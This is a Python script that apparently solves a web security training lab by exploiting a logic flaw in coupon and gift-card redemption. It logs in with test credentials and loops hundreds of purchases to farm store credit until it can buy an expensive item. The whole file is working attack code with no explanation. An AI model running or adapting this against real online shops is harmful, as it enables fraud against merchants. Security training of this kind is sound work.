import requests, sys, urllib3, re 
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def buy_jacket(s, url):
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    print("(+) Logging in as the wiener user...")
    data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as the wiener user...")
        for i in range(420):
            cart_url = url + "/cart"
            add_gift_card = {"productId": "2", "redir": "PRODUCT", "quantity": "1"}
            r = s.post(cart_url, data=add_gift_card, verify=False)

            redeem_coupon_url = url + "/cart/coupon"
            csrf_token = get_csrf_token(s, cart_url)
            redeem_coupon = {"csrf":csrf_token, "coupon": "SIGNUP30"}
            r = s.post(redeem_coupon_url, data=redeem_coupon, verify=False)

            purchase_item_url = url + "/cart/checkout"
            purchase_coupon = {"csrf": csrf_token}
            r = s.post(purchase_item_url, data=purchase_coupon, verify=False)

            res = r.text
            gift_card = re.findall('<tr>\n(.*?)<td>(.*?)<\/td>', res)[0][1]
            
            apply_gift_card_url = url + "/gift-card"
            csrf_token = get_csrf_token(s, url + "/my-account")
            apply_gift_card = {"csrf":csrf_token, "gift-card": gift_card}
            r = s.post(apply_gift_card_url, data=apply_gift_card, verify=False)

        add_jacket = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
        r = s.post(cart_url, data=add_jacket, verify=False, proxies=proxies)

        csrf_token = get_csrf_token(s, cart_url)
        purchase_jacket = {"csrf": csrf_token}
        r = s.post(purchase_item_url, data=purchase_jacket, verify=False, proxies=proxies)

        if 'Congratulations' in r.text:
            print("(+) Successfully completed the exercise and can buy jacket.")
        else:
            print("(-) Exploit failed.")
            sys.exit(-1)
    else:
        print("(-) Could not login as user.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]

    buy_jacket(s, url)

if __name__ == "__main__":
    main()